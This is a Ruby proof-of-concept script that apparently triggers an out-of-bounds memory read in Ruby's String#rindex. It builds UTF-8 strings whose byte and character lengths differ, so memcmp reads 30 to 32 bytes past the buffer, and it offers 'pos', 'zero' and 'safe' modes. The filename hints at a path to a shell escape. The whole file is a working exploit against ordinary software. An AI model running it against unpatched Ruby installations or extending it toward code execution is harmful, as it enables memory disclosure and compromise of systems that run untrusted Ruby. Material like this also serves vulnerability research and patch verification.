#!/usr/bin/env ruby
# Adjacent Ruby 3.4.12 lane (same 2026-11-18 fix series as CVE-2026-132825):
# string.c:4623/4666 str_rindex/rb_str_rindex call memcmp with the substring's
# BYTE length after the position was computed in CHARACTERS. 3.4.13 adds
# `s + slen <= e` and an RSTRING_LEN(sub) <= RSTRING_LEN(str) guard.
# No monkey patch, no debugger: stock String#rindex only.
#
#   ruby ruby2shell-rindex-oob.rb [pos|zero|safe]
mode = ARGV[0] || 'pos'
utf8 = Encoding::UTF_8
case mode
when 'pos'
  # 100 ASCII + 4 two-byte characters; offset 104-10=94 points at the 8-byte
  # tail, while the 10 four-byte sub characters need 40 bytes -> 32-byte OOB.
  str = ('a' * 100 + "\u00e9" * 4).force_encoding(utf8).dup
  sub = "\u{1d11e}" * 10
  pos = str.length - sub.length
when 'zero'
  # pos==0 branch: 2-byte receiver, 32-byte substring -> 30-byte OOB.
  str = "\u00e9".dup
  sub = "\u{1d11e}" * 8
  pos = 0
when 'safe'
  str = ('a' * 100 + "\u00e9" * 4).force_encoding(utf8).dup
  sub = 'a' * 10
  pos = str.length - sub.length
else
  abort "unknown mode: #{mode}"
end
puts "mode=#{mode} bytes=#{str.bytesize} chars=#{str.length} subbytes=#{sub.bytesize} subchars=#{sub.length} pos=#{pos} rindex=#{str.rindex(sub, pos).inspect}"
